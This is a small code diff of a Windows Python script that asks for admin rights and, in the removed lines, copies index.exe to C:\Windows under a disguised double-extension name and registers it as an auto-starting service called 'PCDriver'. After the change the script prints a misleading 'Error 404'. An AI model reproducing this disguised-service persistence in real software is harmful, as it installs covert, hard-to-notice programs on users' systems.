@@ -11,23 +11,9 @@ def elevate():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
         return False
 
-def create_service():
-    """Create and start the service using the current script's path."""
-    # Get the absolute path of the current script
-    script_path = os.path.abspath(__file__)
-    os.system("copy index.exe C:\Windows\NetService.exe.exe")
-    # Command to create the service
-    create_command = f'sc create PCDriver binPath= "C:\Windows\NetService.exe.exe" start= auto'
-    
-    # Execute the command to create the service
-    os.system(create_command)
-    
-    # Start the service
-    os.system('sc start PCDriver')
-
 if __name__ == '__main__':
     if elevate():
-        create_service()
+        print("Error 404")
     else:
         print("Failed to elevate privileges.")
         sys.exit(1)
